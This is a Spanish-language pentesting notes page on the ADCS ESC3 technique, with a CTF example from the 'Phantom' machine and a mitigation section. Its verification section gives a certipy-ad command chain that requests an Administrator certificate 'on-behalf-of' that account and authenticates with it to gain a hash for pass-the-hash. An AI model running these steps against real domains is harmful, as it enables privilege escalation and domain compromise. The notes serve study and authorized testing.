---
tags: [tecnica, explotacion, ad, adcs, esc3]
tipo: tecnica
categoria: explotacion
estado: practicado
maquinas: [Phantom]
---

# ADCS ESC3

## 1. Qué es

Abuso de plantillas de certificados de AD CS con EKU **Certificate Request Agent**, que permiten (on-behalf-of) pedir un certificado **en nombre de** otro usuario.

## 2. Cómo funciona

- Se obtiene un certificado de «agente de inscripción» de una plantilla ESC3.
- Con él se solicita un certificado de autenticación **en nombre de** un privilegiado.
- PKINIT con ese certificado → TGT/hash NT → PtH.

## 3. Cuándo sospecharla

- Plantillas con EKU *Certificate Request Agent*.
- `certipy-ad find -vulnerable` reporta ESC3.

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
certipy-ad find -u user@dom -p '<pw>' -dc-ip <ip> -vulnerable -stdout
certipy-ad req -u user@dom -p '<pw>' -ca <CA> -template <PlantillaESC3>          # agente
certipy-ad req -u user@dom -p '<pw>' -ca <CA> -template User \
  -on-behalf-of 'DOM\Administrador' -pfx agente.pfx -out admin
certipy-ad auth -pfx admin.pfx -dc-ip <ip>
```

## 5. Herramientas

- [[Certipy]], [[BloodHound]] (edges ADCS), [[NetExec]].

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[Phantom]] | Plantilla `Phantom-DevAuth` (ESC3) | cert de Administrador → PtH |

## 7. Falsos positivos / pruebas fallidas

- Una plantilla vulnerable sin **enrollment rights** para tu usuario no sirve.

## 8. Prevención y mitigación

- Retirar EKU *Certificate Request Agent* de plantillas innecesarias; restringir *enroll*.

## 9. Técnicas relacionadas

- [[AD-Abuso-de-ACLs]], [[Pass-The-Hash]], [[PKINIT]]

## Nota de nombre

También referida como [[ADCS - ESC Guide]] en la documentación de Phantom.
